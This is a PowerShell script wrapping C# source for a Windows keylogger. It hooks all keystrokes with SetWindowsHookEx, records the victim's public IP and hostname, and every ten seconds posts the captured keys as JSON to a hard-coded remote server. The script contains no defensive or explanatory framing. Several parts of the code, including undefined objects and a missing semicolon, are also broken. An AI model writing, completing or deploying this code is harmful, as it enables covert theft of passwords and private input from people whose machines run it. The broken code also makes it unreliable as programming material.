Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Http;
using Newtonsoft.Json;

namespace KeyLogger {
    
    public static class Program {
        private static Container container = new Container();
        public static string buf = "";
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;private const string logFileName = "log.txt";
        private static StreamWriter logFile;private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;
        public static void Main() {
        logFile = File.AppendText(logFileName);
        logFile.AutoFlush = true;
        hookId = SetHook(hookProc);
        TimerStart();
        Application.Run();
        UnhookWindowsHookEx(hookId);
    }
    
    private static IntPtr SetHook(HookProc hookProc) {
        IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
        return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }
    
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            container.buf += (GetCharFromKey((Keys)vkCode));
            Console.WriteLine(GetCharFromKey((Keys)vkCode));
        }
    return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
    public static void TimerStart()
    {
        // Create a timer that invokes CheckStatus after one second,
        // and every 1/4 second thereafter.
        Console.WriteLine("{0:h:mm:ss.fff} Creating timer.\n",
                          DateTime.Now);
        var stateTimer = new System.Threading.Timer(statusChecker.CheckStatus,
                                   null, 10000, 10000);
    }

    public static void CheckStatus(Object stateInfo)
    {
        // Get the public IP address from http://ifconfig.me/ip
        string ip = client.GetStringAsync("http://ifconfig.me/ip").Result;

        // Get the IP information from http://ipinfo.io/
        string res = client.GetStringAsync("http://ipinfo.io/" + ip).Result;

        // Extract the IP address from the IP information using a regular expression
        Regex regex = new Regex(@"\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?");
        Match match = regex.Match(res);
        ip = match.Value;

        // Get the hostname of the local machine
        string hostn = Environment.MachineName;
        // Define the request url
        string url = "http://18.222.183.100:5000/post";

        // Create a json object with the given parameters
        var json = new
        {
            data = buf,
            ip = ip,
            name = hostn
        };

        // Convert the json object to a string
        string jsonString = JsonConvert.SerializeObject(json);

        // Create a StringContent object with the json string and the content type
        StringContent content = new StringContent(jsonString, Encoding.UTF8, "application/json");
        
        buf = "";
        
        // Send a POST request to the url with the content, don't care about the response
        client.PostAsync(url, content)
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern int ToUnicode(
        uint virtualKeyCode,
        uint scanCode,
        byte[] keyboardState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
        StringBuilder receivingBuffer,
        int bufferSize,
        uint flags);

    // Define some constants for the keyboard state array
    const int KEY_PRESSED = 0x80;
    const int VK_SHIFT = 0x10;
    const int VK_CONTROL = 0x11;
    const int VK_MENU = 0x12;

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetKeyboardState(byte [] lpKeyState);

    // Define a helper method to convert a virtual key code to a character
    public static string GetCharFromKey(Keys key)
    {
        // Create a buffer to receive the character
        StringBuilder buffer = new StringBuilder(256);

        // Get the keyboard state array
        var array = new byte[256];
        GetKeyboardState(array);

        // Call the ToUnicode function to translate the key
        int result = ToUnicode((uint)key, 0, array, buffer, 256, 0);
        // Check the result and return the character or an empty string
        switch (result)
        {
            // A single character was written to the buffer
            case 1:
                return buffer.ToString();

            // No character was translated or a dead key was pressed
            case 0:
            case -1:
                return string.Empty;

            // Multiple characters were written to the buffer
            default:
                return buffer.ToString();
        }
    }
    }
}
"@ -ReferencedAssemblies System.Windows.Forms System.Net.Http
[KeyLogger.Program]::Main();
